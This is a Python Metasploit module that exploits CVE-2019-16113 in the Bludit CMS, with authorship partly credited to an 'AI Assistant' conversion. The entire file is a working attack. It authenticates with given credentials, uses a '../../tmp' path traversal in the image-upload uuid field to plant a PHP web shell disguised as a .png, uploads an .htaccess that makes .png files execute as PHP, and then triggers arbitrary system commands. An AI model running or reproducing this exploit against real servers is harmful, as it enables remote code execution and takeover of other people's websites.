#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
import logging
import re
import random
import string
import uuid as uuid_lib

# extra modules
dependencies_missing = False
try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    dependencies_missing = True

from metasploit import module


metadata = {
    'name': 'Bludit Directory Traversal Image File Upload Vulnerability',
    'description': '''
        This module exploits a vulnerability in Bludit. A remote user could abuse the uuid
        parameter in the image upload feature in order to save a malicious payload anywhere
        onto the server, and then use a custom .htaccess file to bypass the file extension
        check to finally get remote code execution.
    ''',
    'authors': [
        'christasa',  # Original discovery
        'sinn3r',     # Metasploit module
        'Python conversion by AI Assistant'
    ],
    'date': '2019-09-07',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'cve', 'ref': 'CVE-2019-16113'},
        {'type': 'url', 'ref': 'https://github.com/bludit/bludit/issues/1081'},
        {'type': 'url', 'ref': 'https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac'}
    ],
    'type': 'remote_exploit_cmd_stager',
    'targets': [
        {'platform': 'php', 'arch': 'php'}
    ],
    'payload': {
        'command_stager_flavor': 'php',
    },
    'options': {
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'Target port', 'required': True, 'default': 80},
        'targeturi': {'type': 'string', 'description': 'The base path for Bludit', 'required': True, 'default': '/'},
        'bludituser': {'type': 'string', 'description': 'The username for Bludit', 'required': True, 'default': None},
        'bluditpass': {'type': 'string', 'description': 'The password for Bludit', 'required': True, 'default': None},
        'ssl': {'type': 'bool', 'description': 'Use SSL/TLS', 'required': False, 'default': False},
        'timeout': {'type': 'int', 'description': 'HTTP timeout in seconds', 'required': False, 'default': 10}
    }
}


class PhpPayload:
    def __init__(self, payload_code):
        self.payload = payload_code
        self.name = f"{''.join(random.choices(string.ascii_letters, k=10))}.png"


class LoginBadge:
    def __init__(self, username, password, csrf_token, bludit_key):
        self.username = username
        self.password = password
        self.csrf_token = csrf_token
        self.bludit_key = bludit_key


def generate_php_payload(command):
    """Generate a PHP payload that executes the given command"""
    php_code = f"""<?php
    if (isset($_GET['cmd'])) {{
        system($_GET['cmd']);
    }} else {{
        system('{command}');
    }}
    ?>"""
    return php_code


def generate_random_string(length=10):
    """Generate a random string"""
    return ''.join(random.choices(string.ascii_letters, k=length))


def normalize_uri(*parts):
    """Normalize URI parts into a proper path"""
    path = '/'.join(str(part).strip('/') for part in parts if part)
    return '/' + path if path else '/'


def check_bludit(session, base_url):
    """Check if target is running Bludit CMS"""
    try:
        url = f"{base_url}/index.php"
        response = session.get(url, timeout=10)
        
        if response.status_code != 200:
            return False
        
        soup = BeautifulSoup(response.text, 'html.parser')
        generator_tag = soup.find('meta', {'name': 'generator'})
        
        if generator_tag and generator_tag.get('content') == 'Bludit':
            logging.info('Bludit CMS detected')
            return True
        
        return False
    except Exception as e:
        logging.error(f'Error checking target: {e}')
        return False


def get_login_badge(session, base_url):
    """Get login credentials and tokens"""
    try:
        url = f"{base_url}/admin/index.php"
        response = session.get(url, timeout=10)
        
        if response.status_code != 200:
            raise Exception('Failed to access admin login page')
        
        # Extract BLUDIT-KEY cookie
        bludit_key = ''
        for cookie in session.cookies:
            if cookie.name == 'BLUDIT-KEY':
                bludit_key = cookie.value
                break
        
        # Extract CSRF token
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_element = soup.find('input', {'name': 'tokenCSRF'})
        
        if not csrf_element or not csrf_element.get('value'):
            raise Exception('No tokenCSRF found')
        
        csrf_token = csrf_element['value']
        return csrf_token, bludit_key
    
    except Exception as e:
        logging.error(f'Error getting login badge: {e}')
        return None, None


def do_login(session, base_url, username, password):
    """Perform login to Bludit admin"""
    try:
        csrf_token, bludit_key = get_login_badge(session, base_url)
        if not csrf_token:
            return None
        
        login_badge = LoginBadge(username, password, csrf_token, bludit_key)
        
        # Perform login
        url = f"{base_url}/admin/index.php"
        data = {
            'tokenCSRF': login_badge.csrf_token,
            'username': login_badge.username,
            'password': login_badge.password
        }
        
        response = session.post(url, data=data, timeout=10, allow_redirects=False)
        
        # Check if login was successful (redirect to dashboard)
        if response.status_code in [302, 301] and '/admin/dashboard' in response.headers.get('Location', ''):
            logging.info(f'Successfully logged in as: {username}')
            
            # Get new CSRF token from dashboard
            dashboard_url = f"{base_url}/admin/dashboard/index.php"
            dashboard_response = session.get(dashboard_url, timeout=10)
            
            if dashboard_response.status_code == 200:
                # Extract new CSRF token from JavaScript
                csrf_match = re.search(r'var tokenCSRF = "([^"]+)"', dashboard_response.text)
                if csrf_match:
                    login_badge.csrf_token = csrf_match.group(1)
            
            return login_badge
        else:
            logging.error('Authentication failed')
            return None
    
    except Exception as e:
        logging.error(f'Login error: {e}')
        return None


def get_uuid(session, base_url, login_badge):
    """Retrieve UUID from new content page"""
    try:
        logging.info('Retrieving UUID...')
        url = f"{base_url}/admin/new-content/index.php"
        response = session.get(url, timeout=10)
        
        if response.status_code != 200:
            raise Exception('Failed to access new-content page')
        
        soup = BeautifulSoup(response.text, 'html.parser')
        uuid_element = soup.find('input', {'name': 'uuid'})
        
        if not uuid_element or not uuid_element.get('value'):
            raise Exception('No UUID found in admin/new-content/')
        
        return uuid_element['value']
    
    except Exception as e:
        logging.error(f'Error getting UUID: {e}')
        return None


def upload_file(session, base_url, login_badge, uuid_path, content, filename):
    """Upload file using the image upload functionality"""
    try:
        logging.info(f'Uploading {filename}...')
        
        url = f"{base_url}/admin/ajax/upload-images"
        
        files = {
            'images[]': (filename, content, 'image/png')
        }
        
        data = {
            'uuid': uuid_path,
            'tokenCSRF': login_badge.csrf_token
        }
        
        headers = {
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        response = session.post(url, files=files, data=data, headers=headers, timeout=10)
        
        if response.status_code == 200:
            logging.info(f'Successfully uploaded {filename}')
            return True
        else:
            logging.error(f'Upload failed with status: {response.status_code}')
            return False
    
    except Exception as e:
        logging.error(f'Upload error: {e}')
        return False


def upload_php_payload_and_exec(session, base_url, login_badge, command):
    """Upload PHP payload and .htaccess, then execute"""
    try:
        # Get UUID for directory traversal
        uuid = get_uuid(session, base_url, login_badge)
        if not uuid:
            return False
        
        # Create PHP payload
        php_payload = PhpPayload(generate_php_payload(command))
        
        # Upload PHP payload to tmp directory using directory traversal
        if not upload_file(session, base_url, login_badge, '../../tmp', php_payload.payload, php_payload.name):
            return False
        
        # Create .htaccess to allow PHP execution on .png files
        htaccess_content = """RewriteEngine off
AddType application/x-httpd-php .png"""
        
        if not upload_file(session, base_url, login_badge, uuid, htaccess_content, '.htaccess'):
            return False
        
        # Execute the PHP payload
        logging.info(f'Executing {php_payload.name}...')
        payload_url = f"{base_url}/bl-content/tmp/{php_payload.name}"
        response = session.get(payload_url, timeout=10)
        
        if response.status_code == 200:
            logging.info('Payload executed successfully')
            logging.info(f'Response: {response.text[:200]}...')
            return True
        else:
            logging.error(f'Payload execution failed with status: {response.status_code}')
            return False
    
    except Exception as e:
        logging.error(f'Exploit execution error: {e}')
        return False


def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
    
    if dependencies_missing:
        logging.error('Module dependencies (requests, beautifulsoup4) are missing, cannot continue')
        return
    
    # Build base URL
    protocol = 'https' if args.get('ssl', False) else 'http'
    base_url = f"{protocol}://{args['rhost']}:{args['rport']}{args['targeturi'].rstrip('/')}"
    
    # Create session
    session = requests.Session()
    session.verify = False  # Disable SSL verification
    
    try:
        # Check if target is Bludit
        if not check_bludit(session, base_url):
            logging.error('Target does not appear to be running Bludit CMS')
            return
        
        # Perform login
        login_badge = do_login(session, base_url, args['bludituser'], args['bluditpass'])
        if not login_badge:
            logging.error('Failed to authenticate to Bludit')
            return
        
        # Execute exploit
        # For demonstration, we'll use a simple command
        command = args.get('command', 'id')
        
        if upload_php_payload_and_exec(session, base_url, login_badge, command):
            logging.info('Exploit completed successfully')
        else:
            logging.error('Exploit failed')
    
    except KeyboardInterrupt:
        logging.info('Exploit interrupted by user')
    except Exception as e:
        logging.error(f'Unexpected error: {e}')
    finally:
        session.close()


if __name__ == '__main__':
    module.run(metadata, run)